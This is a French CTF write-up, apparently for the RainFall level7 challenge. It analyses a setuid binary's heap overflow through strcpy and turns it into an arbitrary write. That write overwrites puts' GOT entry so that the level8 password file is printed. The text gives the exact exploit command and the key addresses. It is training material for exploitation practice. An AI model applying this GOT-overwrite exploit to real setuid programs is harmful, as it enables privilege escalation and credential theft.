# Level7 — Analyse technique

## Binaire

- ELF 32-bit i386, setuid setgid level8.
- Imports : printf, fgets, time, strcpy, malloc, puts, **fopen**. Pas de **system**.
- Chaînes : "%s - %d", "/home/user/level8/.pass", "~~" (0x8048703).
- Buffer global **c** (80 octets) @ 0x8049960.

## Structures (main)

- **ptr1** = malloc(8) : `ptr1[0]=1`, `ptr1[1]=malloc(8)` (bloc 2).
- **ptr2** = malloc(8) : `ptr2[0]=2`, `ptr2[1]=malloc(8)` (bloc 4).
- **strcpy(ptr1[1], argv[1])** → copie argv[1] dans le bloc 2 (8 octets), sans limite.
- **strcpy(ptr2[1], argv[2])** → copie argv[2] vers l’adresse contenue dans ptr2[1].

Layout heap typique : [bloc1 8B][bloc2 8B][bloc3 8B][bloc4 8B]. En dépassant 8 octets dans le bloc 2, on écrase le bloc 3, donc **ptr2[0]** et **ptr2[1]** (pointeur vers bloc 4). On contrôle donc **la destination** du second strcpy.

## Flux après les strcpy

- **fopen("/home/user/level8/.pass", "r")**, **fgets(c, 0x44, file)** → le mot de passe est lu dans **c** (0x8049960).
- **puts(0x8048703)** → affiche la chaîne "~~" (adresse en dur dans le code à 0x80485f4).

## Vulnérabilité

- **Arbitrary write** : en overflow on met **ptr2[1]** à une adresse choisie ; le second strcpy écrit argv[2] à cette adresse.
- Écrire l’argument de puts (0x80485f4) pose problème : strcpy écrit 5 octets (adresse + `\0`), le `\0` écrase l’opcode **call** à 0x80485f8 → segfault.
- **Contournement** : remplacer l’entrée **GOT de puts** (0x8049928) par l’adresse de **m** (0x80484f4). **m()** affiche **c** via printf ; l’appel à puts exécutera donc **m()** et le mot de passe sera affiché.

## Exploit

- **argv[1]** : 20 octets (RainFall) puis **0x8049928** (GOT de puts = destination du 2ᵉ strcpy).
- **argv[2]** : **\xf4\x84\x04\x08** (adresse de **m**), écrit dans la GOT.
- Commande :  
  `./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')`

## Adresses utiles

| Élément      | Valeur      |
|-------------|-------------|
| m           | 0x80484f4  |
| c (buffer)  | 0x8049960  |
| GOT puts    | 0x8049928  |
| chaîne "~~" | 0x8048703  |
